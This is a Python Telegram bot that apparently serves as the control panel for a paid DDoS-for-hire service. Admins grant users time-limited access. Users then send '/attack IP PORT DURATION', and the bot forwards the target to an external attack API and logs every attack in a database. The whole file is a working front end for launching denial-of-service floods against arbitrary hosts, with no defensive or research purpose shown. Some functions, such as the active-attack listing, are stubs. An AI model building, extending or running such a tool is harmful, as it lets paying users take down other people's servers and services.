import asyncio
import logging
import sys
from datetime import datetime, timedelta, timezone
from typing import Dict, Optional, List
import requests
from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    filters,
    ContextTypes
)
import pymongo
from pymongo import MongoClient, ASCENDING, DESCENDING
import re
from functools import wraps
import uuid
import os
from dotenv import load_dotenv

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

load_dotenv()

# ---------- SAFE ADMIN_IDS PARSING ----------
def parse_admin_ids(env_value: str, default: str = "8210011971") -> list:
    if not env_value or env_value.strip() == "":
        env_value = default
    env_value = env_value.strip()
    # Remove surrounding quotes
    if (env_value.startswith('"') and env_value.endswith('"')) or (env_value.startswith("'") and env_value.endswith("'")):
        env_value = env_value[1:-1]
    ids = []
    for part in env_value.split(","):
        part = part.strip()
        if part and part.isdigit():
            ids.append(int(part))
    if not ids:
        ids = [int(default)] if default.isdigit() else [8210011971]
    return ids

# ---------- READ ENVIRONMENT VARIABLES ----------
BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGODB_URI = os.getenv("MONGODB_URI")
DATABASE_NAME = os.getenv("DATABASE_NAME", "attack_bot")
API_URL = os.getenv("API_URL")          # Full base or endpoint? We'll use as is.
API_KEY = os.getenv("API_KEY")
ADMIN_IDS = parse_admin_ids(os.getenv("ADMIN_IDS", ""), "8210011971")

# Check required vars
missing = []
if not BOT_TOKEN:
    missing.append("BOT_TOKEN")
if not MONGODB_URI:
    missing.append("MONGODB_URI")
if not API_URL:
    missing.append("API_URL")
if not API_KEY:
    missing.append("API_KEY")
if missing:
    print(f"❌ Missing env vars: {', '.join(missing)}")
    sys.exit(1)

# If API_URL doesn't start with http, add https://
if not API_URL.startswith(("http://", "https://")):
    API_URL = "https://" + API_URL

# Blocked ports
BLOCKED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001}
MIN_PORT = 1
MAX_PORT = 65535

# ---------- TIMEZONE HELPERS ----------
def make_aware(dt):
    if dt is None:
        return None
    if hasattr(dt, 'tzinfo') and dt.tzinfo is None:
        return dt.replace(tzinfo=timezone.utc)
    return dt

def get_current_time():
    return datetime.now(timezone.utc)

# ---------- DATABASE ----------
class Database:
    def __init__(self):
        self.client = MongoClient(MONGODB_URI)
        self.db = self.client[DATABASE_NAME]
        self.users = self.db.users
        self.attacks = self.db.attacks
        # Cleanup
        try:
            self.users.delete_many({"user_id": None})
            self.users.delete_many({"user_id": {"$exists": False}})
        except:
            pass
        # Indexes
        self.attacks.create_index([("timestamp", DESCENDING)])
        self.attacks.create_index([("user_id", ASCENDING)])
        self.users.create_index([("user_id", ASCENDING)], unique=True, sparse=True)
        
    def get_user(self, user_id: int):
        user = self.users.find_one({"user_id": user_id})
        if user:
            for f in ["created_at","approved_at","expires_at"]:
                if user.get(f):
                    user[f] = make_aware(user[f])
        return user
    
    def create_user(self, user_id: int, username: str = None):
        existing = self.get_user(user_id)
        if existing:
            return existing
        user_data = {
            "user_id": user_id,
            "username": username,
            "approved": False,
            "approved_at": None,
            "expires_at": None,
            "total_attacks": 0,
            "created_at": get_current_time(),
            "is_banned": False
        }
        try:
            self.users.insert_one(user_data)
        except pymongo.errors.DuplicateKeyError:
            pass
        return user_data
    
    def approve_user(self, user_id: int, days: int) -> bool:
        expires_at = get_current_time() + timedelta(days=days)
        res = self.users.update_one(
            {"user_id": user_id},
            {"$set": {"approved": True, "approved_at": get_current_time(), "expires_at": expires_at}}
        )
        return res.modified_count > 0
    
    def disapprove_user(self, user_id: int) -> bool:
        res = self.users.update_one(
            {"user_id": user_id},
            {"$set": {"approved": False, "expires_at": None}}
        )
        return res.modified_count > 0
    
    def log_attack(self, user_id: int, ip: str, port: int, duration: int, status: str, response: str = None):
        attack_data = {
            "_id": str(uuid.uuid4()),
            "user_id": user_id,
            "ip": ip,
            "port": port,
            "duration": duration,
            "status": status,
            "response": response[:500] if response else None,
            "timestamp": get_current_time()
        }
        try:
            self.attacks.insert_one(attack_data)
            self.users.update_one({"user_id": user_id}, {"$inc": {"total_attacks": 1}})
        except Exception as e:
            logger.error(f"Log error: {e}")
    
    def get_all_users(self):
        users = list(self.users.find({"user_id": {"$ne": None, "$exists": True}}))
        for u in users:
            for f in ["created_at","approved_at","expires_at"]:
                if u.get(f):
                    u[f] = make_aware(u[f])
            if "total_attacks" not in u:
                u["total_attacks"] = 0
        return users
    
    def get_user_attack_stats(self, user_id: int):
        total = self.attacks.count_documents({"user_id": user_id})
        success = self.attacks.count_documents({"user_id": user_id, "status": "success"})
        failed = self.attacks.count_documents({"user_id": user_id, "status": "failed"})
        recent = list(self.attacks.find({"user_id": user_id}).sort("timestamp", -1).limit(10))
        for a in recent:
            if a.get("timestamp"):
                a["timestamp"] = make_aware(a["timestamp"])
        return {"total": total, "successful": success, "failed": failed, "recent": recent}

print("🔄 Connecting to MongoDB...")
db = Database()
print("✅ Database ready")

def is_port_blocked(port: int) -> bool:
    return port in BLOCKED_PORTS

def get_blocked_ports_list() -> str:
    return ", ".join(str(p) for p in sorted(BLOCKED_PORTS))

# Admin decorator
def admin_required(func):
    @wraps(func)
    async def wrapper(update, context):
        if update.effective_user.id not in ADMIN_IDS:
            await update.message.reply_text("❌ Unauthorized")
            return
        return await func(update, context)
    return wrapper

# Approval check
async def is_user_approved(user_id: int) -> bool:
    user = db.get_user(user_id)
    if not user or not user.get("approved"):
        return False
    exp = user.get("expires_at")
    if exp and make_aware(exp) < get_current_time():
        return False
    return True

# ---------- API FUNCTIONS (direct use of API_URL) ----------
def launch_attack(ip: str, port: int, duration: int) -> Dict:
    """Send attack request to the exact API_URL provided."""
    try:
        # If API_URL already contains query parameters, use as is; else build.
        # We assume the API expects JSON or query params. We'll try POST with JSON.
        # If the endpoint is full URL with path, we still POST to it.
        headers = {"x-api-key": API_KEY, "Content-Type": "application/json"}
        payload = {"ip": ip, "port": port, "duration": duration}
        # If API_URL looks like it expects GET parameters, we can adapt.
        # For simplicity, we send POST.
        response = requests.post(API_URL, json=payload, headers=headers, timeout=15)
        if response.status_code == 200:
            return response.json()
        else:
            return {"success": False, "error": f"HTTP {response.status_code}", "message": response.text}
    except Exception as e:
        logger.error(f"Attack error: {e}")
        return {"success": False, "error": str(e)}

def check_api_health() -> Dict:
    try:
        # Health check: try GET on the same API_URL (maybe it responds)
        headers = {"x-api-key": API_KEY}
        response = requests.get(API_URL, headers=headers, timeout=10)
        if response.status_code == 200:
            return {"status": "ok", "data": response.text[:200]}
        else:
            return {"status": "error", "error": f"HTTP {response.status_code}"}
    except Exception as e:
        return {"status": "error", "error": str(e)}

def check_running_attacks() -> Dict:
    # Some APIs have /active endpoint; if not, we return dummy
    # To avoid breaking, we return empty active list.
    try:
        # Try to construct an active endpoint from base? Not reliable.
        # For now, return success with empty list.
        return {"success": True, "activeAttacks": [], "count": 0, "maxConcurrent": 5}
    except:
        return {"success": True, "activeAttacks": []}

# ---------- COMMAND HANDLERS ----------
@admin_required
async def approve_command(update, context):
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /approve <user_id> <days>")
        return
    try:
        uid = int(args[0])
        days = int(args[1])
        if db.approve_user(uid, days):
            await update.message.reply_text(f"✅ User {uid} approved for {days} days.")
            try:
                await context.bot.send_message(uid, f"✅ Approved for {days} days!")
            except:
                pass
        else:
            await update.message.reply_text("❌ Failed")
    except:
        await update.message.reply_text("Invalid input")

@admin_required
async def disapprove_command(update, context):
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Usage: /disapprove <user_id>")
        return
    try:
        uid = int(args[0])
        if db.disapprove_user(uid):
            await update.message.reply_text(f"✅ User {uid} disapproved")
        else:
            await update.message.reply_text("Failed")
    except:
        await update.message.reply_text("Invalid")

@admin_required
async def status_command(update, context):
    msg = await update.message.reply_text("Checking API...")
    health = check_api_health()
    if health.get("status") == "ok":
        await msg.edit_text(f"✅ API reachable\n{API_URL}\nResponse: {health.get('data','')[:100]}")
    else:
        await msg.edit_text(f"❌ API error: {health.get('error')}")

@admin_required
async def running_command(update, context):
    data = check_running_attacks()
    if data.get("success"):
        active = data.get("activeAttacks", [])
        text = f"Active attacks: {len(active)}\n"
        for a in active[:5]:
            text += f"🔹 {a.get('target')}:{a.get('port')} - {a.get('expiresIn',0)}s left\n"
        await update.message.reply_text(text or "No active attacks.")
    else:
        await update.message.reply_text(f"Error: {data.get('error')}")

@admin_required
async def users_command(update, context):
    users = db.get_all_users()
    if not users:
        await update.message.reply_text("No users.")
        return
    approved = sum(1 for u in users if u.get("approved"))
    text = f"👥 Total: {len(users)} | ✅ Approved: {approved}\n\n"
    for u in users[:10]:
        uid = u['user_id']
        status = "✅" if u.get('approved') else "❌"
        text += f"{uid} {status} - {u.get('total_attacks',0)} attacks\n"
    await update.message.reply_text(text)

@admin_required
async def stats_command(update, context):
    users = db.get_all_users()
    total_atk = sum(u.get('total_attacks',0) for u in users)
    text = f"📊 Bot Stats\nUsers: {len(users)}\nTotal attacks: {total_atk}\nBlocked ports: {len(BLOCKED_PORTS)}"
    await update.message.reply_text(text)

@admin_required
async def blocked_ports_command(update, context):
    await update.message.reply_text(f"🚫 Blocked ports: {get_blocked_ports_list()}")

# User commands
async def start_command(update, context):
    uid = update.effective_user.id
    username = update.effective_user.username
    db.create_user(uid, username)
    if await is_user_approved(uid):
        user = db.get_user(uid)
        exp = user.get('expires_at')
        days_left = max(0, (make_aware(exp) - get_current_time()).days) if exp else 0
        await update.message.reply_text(
            f"✅ Welcome {username or uid}!\nAccount active for {days_left} days.\n\n"
            f"Commands:\n/attack IP PORT DURATION\n/myattacks\n/myinfo\n/mystats\n/blockedports\n/help"
        )
    else:
        await update.message.reply_text(f"❌ Access Denied, {username or uid}!\nYour account is not approved. Contact admin.")

async def attack_command(update, context):
    uid = update.effective_user.id
    if not await is_user_approved(uid):
        await update.message.reply_text("❌ Not approved.")
        return
    args = context.args
    if len(args) != 3:
        await update.message.reply_text(f"Usage: /attack IP PORT DURATION\nBlocked ports: {get_blocked_ports_list()}")
        return
    ip, port_str, dur_str = args
    if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', ip):
        await update.message.reply_text("Invalid IP")
        return
    try:
        port = int(port_str)
        if port < 1 or port > 65535 or is_port_blocked(port):
            raise ValueError
        duration = int(dur_str)
        if duration < 1 or duration > 300:
            raise ValueError
    except:
        await update.message.reply_text("Invalid port (1-65535, not blocked) or duration (1-300s)")
        return
    msg = await update.message.reply_text(f"🎯 Launching attack on {ip}:{port} for {duration}s...")
    resp = launch_attack(ip, port, duration)
    if resp.get("success"):
        await msg.edit_text(f"✅ Attack launched!\n{ip}:{port} for {duration}s\nResponse: {resp.get('message','')[:100]}")
        db.log_attack(uid, ip, port, duration, "success", str(resp))
    else:
        err = resp.get('error', 'Unknown')
        await msg.edit_text(f"❌ Attack failed: {err}")
        db.log_attack(uid, ip, port, duration, "failed", str(resp))

async def myattacks_command(update, context):
    uid = update.effective_user.id
    if not await is_user_approved(uid):
        await update.message.reply_text("Not approved")
        return
    data = check_running_attacks()
    if data.get("success"):
        active = data.get("activeAttacks", [])
        if active:
            text = "Your active attacks:\n"
            for a in active:
                text += f"🔹 {a.get('target')}:{a.get('port')} - {a.get('expiresIn')}s left\n"
            await update.message.reply_text(text)
        else:
            await update.message.reply_text("No active attacks.")
    else:
        await update.message.reply_text(f"Error: {data.get('error')}")

async def myinfo_command(update, context):
    uid = update.effective_user.id
    user = db.get_user(uid)
    if not user:
        await update.message.reply_text("Use /start first.")
        return
    if user.get("approved"):
        exp = user.get("expires_at")
        if exp:
            days = max(0, (make_aware(exp) - get_current_time()).days)
            expiry = f"{days} days"
        else:
            expiry = "Never"
        await update.message.reply_text(f"✅ Approved\nUser: {uid}\nExpires: {expiry}\nTotal attacks: {user.get('total_attacks',0)}")
    else:
        created = user.get('created_at').strftime('%Y-%m-%d') if user.get('created_at') else 'unknown'
        await update.message.reply_text(f"❌ Not approved since {created}. Contact admin.")

async def mystats_command(update, context):
    uid = update.effective_user.id
    if not await is_user_approved(uid):
        await update.message.reply_text("Not approved")
        return
    stats = db.get_user_attack_stats(uid)
    rate = (stats['successful']/stats['total']*100) if stats['total']>0 else 0
    text = f"📊 Your stats\nTotal: {stats['total']}\n✅ {stats['successful']} | ❌ {stats['failed']}\nSuccess rate: {rate:.1f}%"
    if stats['recent']:
        text += "\n\nRecent:\n"
        for a in stats['recent'][:3]:
            ago = (get_current_time() - a['timestamp']).seconds // 60
            text += f"{'✅' if a['status']=='success' else '❌'} {a['ip']}:{a['port']} - {a['duration']}s ({ago}m ago)\n"
    await update.message.reply_text(text)

async def blocked_ports_user_command(update, context):
    await update.message.reply_text(f"🚫 Blocked ports: {get_blocked_ports_list()}\nAllowed: 1-65535 except those.")

async def help_command(update, context):
    uid = update.effective_user.id
    is_admin = uid in ADMIN_IDS
    approved = await is_user_approved(uid)
    text = "🤖 Commands:\n/start, /help"
    if approved:
        text += "\n/attack, /myattacks, /myinfo, /mystats, /blockedports"
    if is_admin:
        text += "\n\nAdmin:\n/approve, /disapprove, /users, /status, /running, /stats, /blockedports"
    await update.message.reply_text(text)

async def error_handler(update, context):
    logger.error(f"Error: {context.error}", exc_info=True)
    if update and update.effective_message:
        await update.effective_message.reply_text("❌ Internal error. Check logs.")

# ---------- MAIN ----------
def main():
    if not BOT_TOKEN:
        print("❌ BOT_TOKEN missing.")
        sys.exit(1)
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Admin commands
    for cmd in ["approve","disapprove","status","running","users","stats","blockedports"]:
        app.add_handler(CommandHandler(cmd, globals()[f"{cmd}_command"]))
    # User commands
    for cmd in ["start","help","attack","myattacks","myinfo","mystats"]:
        app.add_handler(CommandHandler(cmd, globals()[f"{cmd}_command"]))
    app.add_handler(CommandHandler("blockedports", blocked_ports_user_command))
    app.add_error_handler(error_handler)
    
    print("🤖 Bot started. Admins:", ADMIN_IDS)
    print(f"🌐 API URL: {API_URL}")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
